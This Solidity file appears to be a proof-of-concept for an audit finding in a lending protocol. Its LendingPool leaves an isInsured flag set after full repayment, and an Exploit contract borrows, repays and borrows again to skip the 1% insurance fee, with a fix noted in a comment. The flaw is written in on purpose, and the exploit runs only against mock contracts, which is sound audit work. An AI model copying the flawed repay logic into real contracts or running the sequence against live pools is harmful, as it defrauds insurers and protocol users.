// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum — H-20 (Pashov, 2025-05-06)
    Full repayment caps rawInsuredBalance to the new debt (zero) but leaves
    isInsured true. The next borrow skips the 1% insurance fee.
    The control clears isInsured when raw debt hits zero, so the second
    borrow pays another 100 tokens on a 10,000 principal. */

contract DebtToken {
    string public symbol = "crvUSD";
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract InsuranceVault {}

contract LendingPool {
    struct Position {
        uint256 rawDebtBalance;
        uint256 rawInsuredBalance;
        bool isInsured;
    }

    uint256 public constant INSURANCE_FEE_BPS = 100;
    DebtToken public token;
    address public insurance;
    Position public position;
    uint256 public feesCharged;
    bool public clearFlagOnFullRepay;

    constructor(DebtToken _token, address _insurance, bool _clearFlag) {
        token = _token;
        insurance = _insurance;
        clearFlagOnFullRepay = _clearFlag;
    }

    function borrow(uint256 amount) external {
        uint256 fee;
        if (!position.isInsured) {
            fee = amount * INSURANCE_FEE_BPS / 10_000;
            require(token.transferFrom(msg.sender, insurance, fee), "fee");
            position.isInsured = true;
            position.rawInsuredBalance = amount;
            feesCharged += 1;
        }
        position.rawDebtBalance += amount;
        require(token.transfer(msg.sender, amount), "principal");
    }

    function _repay(address, bytes memory, uint256 amount, address) internal {
        require(token.transferFrom(msg.sender, address(this), amount), "repay");
        position.rawDebtBalance -= amount;
        if (position.rawInsuredBalance > position.rawDebtBalance) {
            // @> VULN: insured balance is capped to remaining debt, but isInsured stays true
            position.rawInsuredBalance = position.rawDebtBalance;
        }
        // FIX: if (position.rawDebtBalance == 0) position.isInsured = false;
        if (clearFlagOnFullRepay && position.rawDebtBalance == 0) {
            position.isInsured = false;
        }
    }

    function repay(uint256 amount) external {
        _repay(address(0), bytes(""), amount, msg.sender);
    }
}

contract Borrower {
    function approve(DebtToken token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function borrow(LendingPool pool, uint256 amount) external {
        pool.borrow(amount);
    }

    function repay(LendingPool pool, uint256 amount) external {
        pool.repay(amount);
    }
}

contract Exploit {
    uint256 public constant PRINCIPAL = 10_000 ether;
    uint256 public constant FEE = 100 ether;

    DebtToken public token; // nonce 1
    InsuranceVault public insurance; // nonce 2
    LendingPool public pool; // nonce 3
    Borrower public borrower; // nonce 4

    constructor() {
        token = new DebtToken();
        insurance = new InsuranceVault();
        pool = new LendingPool(token, address(insurance), false);
        borrower = new Borrower();
        token.mint(address(pool), PRINCIPAL * 2);
        token.mint(address(borrower), FEE);
        borrower.approve(token, address(pool), type(uint256).max);
    }

    function run() external {
        borrower.borrow(pool, PRINCIPAL);
        borrower.repay(pool, PRINCIPAL);
        borrower.borrow(pool, PRINCIPAL);
        (uint256 debt, uint256 insured, bool flag) = pool.position();
        require(flag, "flag cleared");
        require(debt == PRINCIPAL, "second loan");
        require(insured == 0, "insured balance");
        require(pool.feesCharged() == 1, "second fee charged");
        require(token.balanceOf(address(insurance)) == FEE, "insurance short one fee");
        require(token.balanceOf(address(borrower)) == PRINCIPAL, "borrower kept the fee");
    }
}
